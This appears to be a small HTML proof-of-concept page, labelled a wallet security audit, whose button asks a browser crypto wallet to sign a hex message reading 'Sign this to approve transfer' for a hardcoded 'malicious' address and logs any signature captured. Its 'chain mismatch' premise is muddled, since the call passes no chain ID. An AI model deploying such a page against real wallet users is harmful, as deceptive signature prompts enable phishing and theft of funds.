<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>High Severity: Signature Exploit Test</title>
    <style>
        body { font-family: -apple-system, Arial, sans-serif; background: #f0f0f0; padding: 20px; }
        .container { background: white; padding: 20px; border-radius: 16px; }
        button { background: #d9534f; color: white; padding: 18px; margin: 12px 0; width: 100%; border: none; border-radius: 12px; font-weight: bold; }
        .log { margin-top: 20px; padding: 15px; background: #222; color: #0f0; border-radius: 12px; font-family: monospace; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Security Audit: Signature Exploit</h2>
        <button id="exploitSign">Attempt Malicious Sign (Chain Mismatch)</button>
        <div class="log" id="logs">Ready to test...</div>
    </div>

    <script>
        function log(msg) { document.getElementById('logs').innerHTML += `<br>> ${msg}`; }

        document.getElementById('exploitSign').onclick = async () => {
            const malAddress = '0x1111111254eeb25477b68fb85ed929f73a960582';
            const message = "0x5369676e207468697320746f20617070726f7665207472616e73666572"; // "Sign this to approve transfer"
            
            log("Attempting personal_sign with mismatched Chain ID...");
            
            try {
                // Mencoba memicu tanda tangan dengan asumsi browser tidak memvalidasi konteks chain
                const signature = await window.ethereum.request({
                    method: 'personal_sign',
                    params: [message, malAddress] 
                });
                log("SIGNATURE CAPTURED: " + signature.substring(0,20) + "...");
                log("CRITICAL: Browser allowed signature without chain validation!");
            } catch (e) {
                log("Blocked: " + e.message);
            }
        };
    </script>
</body>
</html>
